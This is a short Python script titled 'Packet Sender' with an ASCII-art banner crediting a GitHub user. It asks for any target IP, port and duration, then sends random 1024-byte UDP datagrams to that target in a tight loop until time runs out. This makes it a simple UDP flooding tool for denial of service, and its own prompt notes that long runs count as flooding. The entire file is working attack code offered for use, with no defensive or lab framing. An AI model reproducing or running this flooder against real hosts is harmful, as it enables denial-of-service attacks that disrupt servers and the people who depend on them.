import socket
import random
import time
print("\033[1;35;40m \n")
print("██████╗░░█████╗░░█████╗░██╗░░██╗███████╗████████╗  ░██████╗███████╗███╗░░██╗██████╗░███████╗██████╗░")
print("██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚══██╔══╝  ██╔════╝██╔════╝████╗░██║██╔══██╗██╔════╝██╔══██╗")
print("██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░░░░██║░░░  ╚█████╗░█████╗░░██╔██╗██║██║░░██║█████╗░░██████╔╝")
print("██╔═══╝░██╔══██║██║░░██╗██╔═██╗░██╔══╝░░░░░██║░░░  ░╚═══██╗██╔══╝░░██║╚████║██║░░██║██╔══╝░░██╔══██╗")
print("██║░░░░░██║░░██║╚█████╔╝██║░╚██╗███████╗░░░██║░░░  ██████╔╝███████╗██║░╚███║██████╔╝███████╗██║░░██║")
print("╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝")
print("\033[1;34;40m by plainjack56 \n")
print("https://github.com/PlainJack56")
print("\033[1;32;40m \n")
print("———————————————————————————————————————————————————————————")
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1024)
ip=input('Target IP: ')
port=int(input('Port(recomended over 1000): '))
duration=input('How long to send packets (sending for too long is classed as flooding): ')
timeout=time.time() + float(duration)
sent=0
while True:
        if time.time()>timeout:
                break
        else:
                pass
        sock.sendto(bytes,(ip, port))
        sent=sent+1
        print("\033[1;36;40m \n")
        print("sent %s packets to %s through port %s"%(sent, ip, port))
print("\033[1;32;40m \n")
print("———————————————————————————————————————————————————————————")
